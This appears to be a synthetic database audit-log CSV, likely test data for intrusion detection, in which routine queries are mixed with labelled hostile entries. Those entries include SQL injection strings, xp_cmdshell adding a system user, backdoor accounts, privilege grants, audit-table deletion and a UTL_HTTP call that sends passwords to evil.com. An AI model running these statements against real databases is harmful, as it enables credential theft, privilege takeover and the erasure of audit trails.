timestamp,username,action,object_name,sql_text,client_ip,returncode,session_id
2026-01-09T23:33:50.276274,WEB_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.139,0,SID1039
2026-01-09T22:30:50.276274,APP_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.140,0,SID1040
2026-01-09T21:27:50.276274,REPORT_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.141,0,SID1041
2026-01-09T20:24:50.276274,ETL_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.142,0,SID1042
2026-01-09T19:21:50.276274,WEB_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.143,0,SID1043
2026-01-09T18:18:50.276274,APP_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.144,0,SID1044
2026-01-09T17:15:50.276274,REPORT_USER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE department_id = 10,192.168.1.145,0,SID1045
2026-01-09T16:12:50.276274,ETL_USER,UPDATE,CUSTOMERS,UPDATE customers SET status = 'ACTIVE' WHERE id = 123,192.168.1.146,0,SID1046
2026-01-09T15:09:50.276274,WEB_USER,INSERT,ORDERS,"INSERT INTO orders VALUES (100, 'Product A', 50)",192.168.1.147,0,SID1047
2026-01-09T14:06:50.276274,APP_USER,SELECT,PRODUCTS,SELECT COUNT(*) FROM products WHERE category = 'Electronics',192.168.1.148,0,SID1048
2026-01-09T13:03:50.276274,REPORT_USER,DELETE,TEMP_TABLE,DELETE FROM temp_table WHERE created_date < SYSDATE - 7,192.168.1.149,0,SID1049
2026-01-11T16:30:50.276274,ATTACKER,SELECT,USERS,SELECT * FROM users WHERE id = '1' OR '1'='1' --,10.0.0.50,0,SID2000
2026-01-11T14:30:50.276274,HACKER,SELECT,ACCOUNTS,SELECT * FROM accounts UNION SELECT password FROM sys.user$,10.0.0.51,0,SID2001
2026-01-11T12:30:50.276274,MALICIOUS,DROP,AUDIT_LOGS,'; DROP TABLE audit_logs; --,10.0.0.52,0,SID2002
2026-01-11T10:30:50.276274,ATTACKER,SELECT,CREDIT_CARDS,SELECT * FROM credit_cards WHERE 1=1 OR 'a'='a',10.0.0.53,0,SID2003
2026-01-11T08:30:50.276274,ROOT,EXEC,SYSTEM,EXEC xp_cmdshell('net user hacker pass /add'),10.0.0.54,0,SID2004
2026-01-11T06:30:50.276274,COMPROMISED,GRANT,DBA_ROLE,GRANT DBA TO app_user WITH ADMIN OPTION,10.0.0.55,0,SID2005
2026-01-11T04:30:50.276274,ATTACKER,ALTER,SYS,ALTER USER sys IDENTIFIED BY newpass,10.0.0.56,0,SID2006
2026-01-11T02:30:50.276274,INSIDER,CREATE,USER,CREATE USER backdoor IDENTIFIED BY secret123,10.0.0.57,0,SID2007
2026-01-11T00:30:50.276274,MALICIOUS,GRANT,PUBLIC,GRANT ALL PRIVILEGES TO public,10.0.0.58,0,SID2008
2026-01-10T22:30:50.276274,INSIDER,SELECT,EMPLOYEES,SELECT * FROM employees WHERE salary > 100000,10.0.0.59,0,SID2009
2026-01-10T20:30:50.276274,THIEF,SELECT,PAYMENTS,"SELECT customer_name, credit_card FROM payments",10.0.0.60,0,SID2010
2026-01-10T18:30:50.276274,HACKER,EXEC,UTL_HTTP,BEGIN UTL_HTTP.REQUEST('http://evil.com?data='||password); END;,10.0.0.61,0,SID2011
2026-01-10T16:30:50.276274,ATTACKER,DROP,AUD$,DROP TABLE sys.aud$ CASCADE,10.0.0.62,0,SID2012
2026-01-10T14:30:50.276274,HACKER,TRUNCATE,AUDIT,TRUNCATE TABLE unified_audit_trail,10.0.0.63,0,SID2013
2026-01-10T12:30:50.276274,MALICIOUS,ALTER,AUDIT_LOGS,ALTER TABLE audit_logs DISABLE ALL TRIGGERS,10.0.0.64,0,SID2014
2026-01-10T10:30:50.276274,BRUTE_FORCE,CONNECT,DATABASE,CONNECT sys/wrongpass AS SYSDBA,10.0.0.65,1017,SID2015
2026-01-10T08:30:50.276274,BRUTE_FORCE,CONNECT,DATABASE,CONNECT system/test123,10.0.0.66,1017,SID2016
2026-01-11T03:24:50.276274,APP_USER,SELECT,CUSTOMERS,SELECT * FROM customers WHERE status = 'VIP',10.0.0.67,0,SID2017
2026-01-11T02:15:50.276274,ETL_USER,UPDATE,SALARIES,UPDATE salaries SET amount = amount * 1.5,10.0.0.68,0,SID2018
2026-01-10T02:30:50.276274,ATTACKER,SELECT,DBA_USERS,SELECT * FROM dba_users WHERE account_status = 'OPEN',10.0.0.69,0,SID2019
